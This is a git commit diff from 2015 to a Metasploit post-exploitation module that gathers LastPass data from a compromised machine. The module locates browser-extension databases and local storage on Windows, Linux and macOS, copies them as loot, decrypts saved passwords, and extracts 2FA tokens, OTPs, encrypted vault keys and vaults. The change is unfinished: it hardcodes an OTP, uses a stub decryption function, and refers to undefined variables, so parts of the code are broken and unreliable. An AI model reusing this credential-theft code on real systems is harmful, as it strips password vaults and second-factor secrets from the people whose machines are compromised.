a3365a9c7f8d32b482a80d624182139b64473a4b
Martin Vigo <martinvigo@gmail.com>
2015-07-28 00:15:08 -0700

    Add key, 2fa, iterations and otp support

--- modules/post/multi/gather/lastpass_creds.rb
+++ modules/post/multi/gather/lastpass_creds.rb
@@ -42,28 +42,32 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    lastpass_data = {} #Contains all LastPass info
-
     print_status "Extracting credentials"
-    lastpass_data = extract_credentials(account_map)
+    extract_credentials(account_map)
 
     print_status "Extracting 2FA tokens"
-    localstorage_map = build_localstorage_map
-    lastpass_data = check_localstorage_for_2FA_token(localstorage_map, lastpass_data) unless localstorage_map.empty?
+    extract_2fa_tokens(account_map)
 
-    print_lastpass_data(lastpass_data)
+    print_status "Extracting encryption keys"
+    extract_keys(account_map)
+
+    print_status "Extracting vault and iterations"                           
+    extract_vault_and_iterations(account_map)
+
+    print_lastpass_data(account_map)
   end
 
 
-  # Returns a mapping of { Account => { Browser => paths } }
+  # Returns a mapping of lastpass accounts
   def build_account_map
     platform = session.platform
     profiles = user_profiles
-    found_dbs_map = {}
+    account_map = {}
 
     profiles.each do |user_profile|
       account = user_profile['UserName']
       browser_path_map = {}
+      localstorage_path_map = {}
 
       case platform
       when /win/
@@ -73,11 +77,22 @@ class Metasploit3 < Msf::Post
           'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
           'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         }
+        localstorage_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
+          'Firefox' => "#{user_profile['LocalAppData']}\\LastPass",
+          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
+          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
+        }
       when /unix|linux/
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
           'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
           'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
+        }
+        localstorage_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
+          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
+          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
         }
       when /osx/
         browser_path_map = {
@@ -86,18 +101,30 @@ class Metasploit3 < Msf::Post
           'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
           'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         }
+        localstorage_path_map = {
+          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
+          'Firefox' => "#{user_profile['LocalAppData']}/LastPass",
+          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
+          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
+        }
       else
         print_error "Platform not recognized: #{platform}"
       end
 
-      found_dbs_map[account] = {}
+      account_map[account] = {}
       browser_path_map.each_pair do |browser, path|
+        account_map[account][browser] = {}
         db_paths = find_db_paths(path, browser, account)
-        found_dbs_map[account][browser] = db_paths unless db_paths.empty?
+        if db_paths && db_paths.size > 0
+          account_map[account][browser]['lp_db_path'] = db_paths
+          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser == 'Firefox'
+        else
+          account_map[account].delete(browser)
+        end
       end
     end
 
-    found_dbs_map
+    account_map
   end
 
   # Returns a list of DB paths found in the victims' machine
@@ -251,26 +278,18 @@ class Metasploit3 < Msf::Post
     begin
       decrypted_password = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
     rescue
-      print_error "Password for #{email} could not be decrypted"
+      vprint_error "Password for #{email} could not be decrypted"
     end
 
     decrypted_password
   end
 
-
-
-
-
-
-
   def extract_credentials(account_map)
-    credentials = account_map # All credentials to be decrypted
-    
     account_map.each_pair do |account, browser_map|
       browser_map.each_pair do |browser, paths|
-        credentials[account][browser] = Hash.new # Get rid of the browser paths
+        account_map[account][browser]['lp_creds'] = {}
         if browser == 'Firefox'
-          paths.each do |path|
+          paths['lp_db_path'].each do |path|
             data = read_file(path)
             loot_path = store_loot(
               'firefox.preferences',
@@ -285,6 +304,7 @@ class Metasploit3 < Msf::Post
             ffcreds = firefox_credentials(loot_path)
             unless ffcreds.blank?
               ffcreds.each do |creds|
+                creds[1].blank? ? creds[1] = "NOT_FOUND" : creds[1] = clear_text_password(URI.unescape(creds[0]), URI.unescape(creds[1])) #Decrypt credentials
                 credentials[account][browser][URI.unescape(creds[0])] = [URI.unescape(creds[1])]
               end
             else
@@ -293,7 +313,7 @@ class Metasploit3 < Msf::Post
 
           end
         else # Chrome, Safari and Opera
-          paths.each do |path|
+          paths['lp_db_path'].each do |path|
             data = read_file(path)
             loot_path = store_loot(
               "#{browser.downcase}.lastpass.database",
@@ -303,6 +323,7 @@ class Metasploit3 < Msf::Post
               nil,
               "#{account}'s #{browser} LastPass database #{path}"
             )
+            account_map[account][browser]['lp_db_loot'] = loot_path
 
             # Parsing/Querying the DB
             db = SQLite3::Database.new(loot_path)
@@ -314,70 +335,23 @@ class Metasploit3 < Msf::Post
             for row in result
               if row[0]
                 row[1].blank? ? row[1] = "NOT_FOUND" : row[1] = clear_text_password(row[0], row[1]) #Decrypt credentials
-                credentials[account][browser][row[0]] = [row[1]]
+                account_map[account][browser]['lp_creds'][row[0]] = {'lp_password' => row[1]}
               end
             end
           end
         end
       end
     end
-
-    credentials
-  end
-
-
-  # Returns a localstorage mapping of { Account => { Browser => paths } }
-  def build_localstorage_map
-    platform = session.platform
-    profiles = user_profiles
-    found_localstorage_map = {}
-
-    profiles.each do |user_profile|
-      account = user_profile['UserName']
-      browser_path_map = {}
-
-      case platform
-      when /win/
-        browser_path_map = {
-          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          'Firefox' => "#{user_profile['LocalAppData']}\\LastPass",
-          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
-          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
-        }
-      when /unix|linux/
-        browser_path_map = {
-          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
-          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
-        }
-      when /osx/
-        browser_path_map = {
-          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
-          'Firefox' => "#{user_profile['LocalAppData']}/LastPass",
-          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
-          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
-        }
-      else
-        print_error "Platform not recognized: #{platform}"
-      end
-
-      found_localstorage_map[account] = {}
-      browser_path_map.each_pair do |browser, path|
-        found_localstorage_map[account][browser] = path if client.fs.file.exists?(path)
-      end
-    end
-
-    found_localstorage_map
   end
 
 
   #Extracts the 2FA token from localStorage
-  def check_localstorage_for_2FA_token(localstorage_map, lastpass_data)
-    localstorage_map.each_pair do |account, browser_map|
-      browser_map.each_pair do |browser, path|
+  def extract_2fa_tokens(account_map)
+    account_map.each_pair do |account, browser_map|
+      browser_map.each_pair do |browser, lp_data|
         if browser == 'Firefox'
-          lastpass_data[account][browser].each_pair do |username, data|
-            path = path + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
+          lastpass_data[account][browser].each_pair do |username, user_data|
+            path = path + client.fs.file.separator + "lp.suid"
             data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
             data = "DECRYPTION_ERROR" if (data.blank? || data.size != 32) # Verify content
             loot_path = store_loot(
@@ -389,17 +363,18 @@ class Metasploit3 < Msf::Post
               "Firefox 2FA token file #{path}"
             )
             lastpass_data[account][browser][username] << data
+
           end
           
         else # Chrome, Safari and Opera
-          data = read_file(path)
+          data = read_file(lp_data['localstorage_db'])
           loot_path = store_loot(
             "#{browser.downcase}.lastpass.localstorage",
             'application/x-sqlite3',
             session,
             data,
             nil,
-            "#{account}'s #{browser} LastPass localstorage #{path}"
+            "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}"
           )
 
           # Parsing/Querying the DB
@@ -409,37 +384,33 @@ class Metasploit3 < Msf::Post
             "WHERE key = 'lp.uid';"
           ).flatten
 
-          lastpass_data[account][browser].each_pair do |username, data|
-            token.blank? ? lastpass_data[account][browser][username] << "NOT_FOUND" : lastpass_data[account][browser][username] << token.pack('H*')
-          end
+          token.blank? ? account_map[account][browser]['lp_2fa'] = "NOT_FOUND" : account_map[account][browser]['lp_2fa'] = token.pack('H*')
         end
       end
     end
-
-    lastpass_data
   end
 
 
   #Print all extracted LastPass data
-  def print_lastpass_data(lastpass_data)
+  def print_lastpass_data(account_map)
     lastpass_data_table = Rex::Ui::Text::Table.new(
       'Header' => "LastPass data",
       'Indent' => 1,
-      'Columns' => %w(Account Browser LastPass_Username LastPass_Password, LastPass_2FA)
+      'Columns' => %w(Account Browser LP_Username LP_Password LP_2FA LP_Key)
     )
 
-    lastpass_data.each_pair do |account, browser_map|
-      browser_map.each_pair do |browser, username_map|
-        username_map.each_pair do |user, data|
-          lastpass_data_table << [account, browser, user] + data
+    account_map.each_pair do |account, browser_map|
+      browser_map.each_pair do |browser, lp_data|
+        lp_data['lp_creds'].each_pair do |username, user_data|
+          lastpass_data_table << [account, browser, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
         end
       end
     end
 
-    unless lastpass_data.empty?
+    unless account_map.empty?
       print_good lastpass_data_table.to_s
       path = store_loot(
-        "lastpass.creds",
+        "lastpass.data",
         "text/csv",
         session,
         lastpass_data_table.to_csv,
@@ -447,7 +418,173 @@ class Metasploit3 < Msf::Post
         "LastPass Data"
       )
     end
+  end
+
+
+  def extract_vault_and_iterations(account_map)
+    account_map.each_pair do |account, browser_map|
+      browser_map.each_pair do |browser, lp_data|
+        lp_data['lp_creds'].each_pair do |username, user_data|
+          if browser == 'Firefox'
+            path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
+            data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+            data = "NOT FOUND" if data.blank? # Verify content
+            lastpass_data[account][browser][username] << data
+
+          else # Chrome, Safari and Opera
+            db = SQLite3::Database.new(lp_data['lp_db_loot'])
+            result = db.execute(
+              "SELECT data FROM LastPassData " \
+              "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'accts'"
+            )
+
+            if result.size == 1 && !result[0].blank?
+              if  /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
+                lp_data['lp_creds'][username]['iterations'] = iterations
+                loot_path = store_loot(
+                  "#{browser.downcase}.lastpass.vault",
+                  'text/plain',
+                  session,
+                  vault,
+                  nil,
+                  "#{account}'s #{browser} LastPass Vault #{lp_data['lp_db_loot']}"
+                )
+                lp_data['lp_creds'][username]['vault_loot'] = loot_path
+              else
+                lp_data['lp_creds'][username]['iterations'] = 1
+                loot_path = store_loot(
+                  "#{browser.downcase}.lastpass.vault",
+                  'text/plain',
+                  session,
+                  result[0][0],
+                  nil,
+                  "#{account}'s #{browser} LastPass Vault #{lp_data['lp_db_loot']}"
+                )
+                lp_data['lp_creds'][username]['vault_loot'] = loot_path
+              end
+            else
+              lp_data['lp_creds'][username]['iterations'] = "NOT_FOUND"
+              lp_data['lp_creds'][username]['vault_loot'] = "NOT_FOUND"
+            end
+          end
+        end
+      end
+    end
+  end
+
+
+
+
+  def extract_keys(account_map)
+    account_map.each_pair do |account, browser_map|
+      browser_map.each_pair do |browser, lp_data|
+        lp_data['lp_creds'].each_pair do |username, user_data|
+          otp, encrypted_key = extract_otp_and_encrypted_key(account, browser, username, lp_data['lp_db_loot'])
+          #otp_token = OpenSSL::Digest::SHA256.hexdigest( OpenSSL::Digest::SHA256.hexdigest( username + otp ) + otp )
+          otp = "7b88275911a8efc3efe50a3bda6ac202"
+          otpbin = [otp].pack "H*"
+          otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin )
+          lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key(username, otp_token, encrypted_key)
+
+
+        end
+      end
+    end
+  end
+
+
+  # Returns otp, encrypted_key
+  def extract_otp_and_encrypted_key(account, browser, username, path)    
+    if browser == 'Firefox'
+      path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
+      otp = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+      otp = "NOT FOUND" if otp.blank? # Verify content
+
+      path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lpall.slps"
+      encrypted_key = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
+      encrypted_key = "NOT FOUND" if encrypted_key.blank? # Verify content
+      data = encrypted_key.split("\r")[0]
+      return [otp, encrypted_key] 
+    else # Chrome, Safari and Opera
+      db = SQLite3::Database.new(path)
+      result = db.execute(
+        "SELECT type, data FROM LastPassData " \
+        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type IN ('otp', 'key')"
+      )
+
+      if result.size == 2
+        if result[0][0] == "otp"
+          return result[0][1], result[1][1] 
+        else 
+          return result[1][1], result[0][1] 
+        end
+      end
+
+      return "", ""
+    end
+  end
+
+
+  def decrypt_vault_key(username, token, encrypted_key)
+    return "adecryptionkey"
 
   end
+
+
+  # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
+  def lastpass_sha256(input)
+    output = ""
+
+    input.split("").each do |char|
+      digit = char.ord
+      if (digit <= 128)
+        output += digit.chr
+      else
+        output += (digit >> 6 | 192).chr
+        output += (digit >> 6 & 63 | 128).chr
+        output += (digit & 63 | 128).chr
+      end
+    end
+
+    #Nasty hack to switch Windows /r/n for /n
+    output = output.delete 130.chr+131.chr
+    output << 130.chr
+
+    return OpenSSL::Digest::SHA256.hexdigest(output)
+  end
+
+
+  def lastpass_sha256_test(input)
+    input = "7b88275911a8efc3efe50a3bda6ac202"
+    input = [input].pack "H*"
+    output = ""
+    #inputbin = [input].pack "H*"
+    puts input
+    input.split("").each do |char|
+      digit = char.ord
+      if (digit <= 128)
+        output += digit.chr
+      else
+        output += (digit >> 6 | 192).chr
+        output += (digit >> 6 & 63 | 128).chr
+        output += (digit & 63 | 128).chr
+      end
+      
+    end
+
+    input.split("").each do |char|
+      puts char.ord
+    end
+    puts OpenSSL::Digest::SHA256.hexdigest(output)
+    #return
+
+    #Nasty hack to switch Windows /r/n for /n
+    #output = output.delete 130.chr+131.chr
+    #output << 130.chr
+
+    return OpenSSL::Digest::SHA256.hexdigest(output)
+  end
+
+
 
 end
